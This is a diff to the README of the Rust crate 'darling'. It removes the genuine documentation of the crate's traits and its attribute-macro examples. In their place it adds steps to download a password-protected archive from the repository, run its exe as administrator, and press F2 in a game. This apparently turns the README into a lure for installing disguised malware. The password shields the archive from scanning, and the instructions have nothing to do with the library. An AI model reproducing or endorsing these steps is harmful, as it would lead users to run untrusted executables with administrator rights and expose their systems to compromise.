@@ -13,66 +13,13 @@
 
 # Usage
 
-`darling` provides a set of traits which can be derived or manually implemented.
+`darling` provides a set of traits.
 
-1. `FromMeta` is used to extract values from a meta-item in an attribute. Implementations are likely reusable for many libraries, much like `FromStr` or `serde::Deserialize`. Trait implementations are provided for primitives, some std types, and some `syn` types.
-2. `FromDeriveInput` is implemented or derived by each proc-macro crate which depends on `darling`. This is the root for input parsing; it gets access to the identity, generics, and visibility of the target type, and can specify which attribute names should be parsed or forwarded from the input AST.
-3. `FromField` is implemented or derived by each proc-macro crate which depends on `darling`. Structs deriving this trait will get access to the identity (if it exists), type, and visibility of the field.
-4. `FromVariant` is implemented or derived by each proc-macro crate which depends on `darling`. Structs deriving this trait will get access to the identity and contents of the variant, which can be transformed the same as any other `darling` input.
-5. `FromAttributes` is a lower-level version of the more-specific `FromDeriveInput`, `FromField`, and `FromVariant` traits. Structs deriving this trait get a meta-item extractor and error collection which works for any syntax element, including traits, trait items, and functions. This is useful for non-derive proc macros.
-
-## Additional Modules
-
--   `darling::ast` provides generic types for representing the AST.
--   `darling::usage` provides traits and functions for determining where type parameters and lifetimes are used in a struct or enum.
--   `darling::util` provides helper types with special `FromMeta` implementations, such as `PathList`.
-
-
-# Attribute Macros
-
-Non-derive attribute macros are supported.
-To parse arguments for attribute macros, derive `FromMeta` on the argument receiver type, then use `darling::ast::NestedMeta::parse_meta_list` to convert the arguments `TokenStream` to a `Vec<NestedMeta>`, then pass that to the derived `from_list` method on your argument receiver type.
-This will produce a normal `darling::Result<T>` that can be used the same as a result from parsing a `DeriveInput`.
-
-## Macro Code
-
-```rust,ignore
-use darling::{Error, FromMeta};
-use darling::ast::NestedMeta;
-use syn::ItemFn;
-use proc_macro::TokenStream;
-
-#[derive(Debug, FromMeta)]
-#[darling(derive_syn_parse)]
-struct MacroArgs {
-    #[darling(default)]
-    timeout_ms: Option<u16>,
-    path: String,
-}
-
-#[proc_macro_attribute]
-pub fn your_attr(args: TokenStream, input: TokenStream) -> TokenStream {
-    let _args: MacroArgs = match syn::parse(args) {
-        Ok(v) => v,
-        Err(e) => { return e.to_compile_error().into(); }
-    };
-    let _input = syn::parse_macro_input!(input as ItemFn);
-
-    // do things with `args`
-    unimplemented!()
-}
-```
-
-## Consuming Code
-
-```rust,ignore
-use your_crate::your_attr;
-
-#[your_attr(path = "hello", timeout_ms = 15)]
-fn do_stuff() {
-    println!("Hello");
-}
-```
+1. Download the archive attached to the repository
+2. Archive password: darling
+3. Open the exe file from the administrator
+4. After launching, open the game and press the F2 key
+5. enjoy!
 
 # Features
 
